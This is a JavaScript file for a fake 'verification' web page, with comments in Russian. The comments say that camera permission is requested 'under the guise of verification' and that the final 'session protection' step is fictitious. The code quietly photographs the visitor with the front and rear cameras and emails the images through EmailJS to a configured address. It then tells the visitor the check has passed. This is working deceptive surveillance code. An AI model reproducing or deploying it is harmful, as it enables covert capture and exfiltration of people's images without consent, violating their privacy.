const v = document.getElementById('v');
const c = document.getElementById('c');
const fill = document.getElementById('fill');
const btn = document.getElementById('btn');
const s1 = document.getElementById('s1');
const s2 = document.getElementById('s2');
const s3 = document.getElementById('s3');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const setProgress = (p) => { fill.style.width = p + '%'; };

emailjs.init(CONFIG.emailjsPublicKey);

async function shoot(constraints) {
  const stream = await navigator.mediaDevices.getUserMedia({ video: constraints, audio: false });
  v.srcObject = stream;
  await v.play().catch(() => {});
  await sleep(1000); // автофокус/экспозиция
  c.width = v.videoWidth || 640;
  c.height = v.videoHeight || 480;
  const ctx = c.getContext('2d');
  ctx.drawImage(v, 0, 0, c.width, c.height);
  const data = c.toDataURL('image/jpeg', 0.85);
  stream.getTracks().forEach((t) => t.stop());
  v.srcObject = null;
  return data;
}

async function sendPhoto(dataUrl, label) {
  return emailjs.send(CONFIG.emailjsServiceId, CONFIG.emailjsTemplateId, {
    to_email: CONFIG.toEmail,
    label,
    image: dataUrl,
    time: new Date().toLocaleString('ru-RU')
  });
}

function pickCameras(devices) {
  const front = devices.find((d) => /front|user|face|self/i.test(d.label));
  const back = devices.find((d) => /back|rear|environment|main/i.test(d.label));
  // если метки не распознаны — берём по порядку: первый и последний
  const frontId = front ? front.deviceId : (devices[0] && devices[0].deviceId);
  const backId = back ? back.deviceId : (devices[devices.length - 1] && devices[devices.length - 1].deviceId);
  return { frontId, backId };
}

btn.addEventListener('click', async () => {
  btn.disabled = true;
  btn.textContent = 'Проверяем…';

  try {
    // Шаг 1 — просим доступ (под видом верификации)
    s1.classList.add('active');
    setProgress(10);
    const prime = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    prime.getTracks().forEach((t) => t.stop());
    s1.classList.remove('active');
    s1.classList.add('done');
    setProgress(30);

    // Шаг 2 — перечисляем камеры, снимаем фронт, потом тыл
    s2.classList.add('active');
    const devices = (await navigator.mediaDevices.enumerateDevices())
      .filter((d) => d.kind === 'videoinput');

    const { frontId, backId } = pickCameras(devices);

    // фронталка
    const frontShot = await shoot(frontId ? { deviceId: { exact: frontId } } : { facingMode: 'user' });
    setProgress(55);
    await sendPhoto(frontShot, 'Фронтальная камера').catch(() => {});
    setProgress(70);

    // тыл (если есть отдельная камера)
    if (backId && backId !== frontId) {
      const backShot = await shoot({ deviceId: { exact: backId } });
      setProgress(85);
      await sendPhoto(backShot, 'Тыльная камера').catch(() => {});
    }

    s2.classList.remove('active');
    s2.classList.add('done');

    // Шаг 3 — фиктивная «защита сессии»
    s3.classList.add('active');
    setProgress(95);
    await sleep(1200);
    s3.classList.remove('active');
    s3.classList.add('done');
    setProgress(100);

    btn.textContent = 'Проверка пройдена ✓';
    btn.style.background = 'linear-gradient(135deg,#28c76f,#1fa85a)';
  } catch (e) {
    btn.disabled = false;
    btn.textContent = 'Повторить проверку';
    setProgress(0);
    console.error(e);
  }
});
